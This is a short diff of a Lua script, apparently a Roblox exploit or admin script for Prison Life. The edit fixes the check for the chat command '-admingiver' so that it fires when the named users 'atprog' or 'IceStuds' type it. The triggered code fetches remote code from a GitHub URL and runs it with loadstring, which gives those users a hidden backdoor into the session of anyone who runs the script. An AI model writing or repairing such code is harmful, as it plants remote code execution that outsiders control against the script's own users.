@@ -6166,7 +6166,7 @@ v.Chatted:Connect(function(msg)
                                      game.Players:Chat(".admin icestuds")
                 end
 
-                if string.sub(msg:lower(), 0, 5) == "-admingiver" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
+                if string.sub(msg:lower(), 0, 11) == "-admingiver" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/prisonlife/main/admingiver"))()
                 end
 
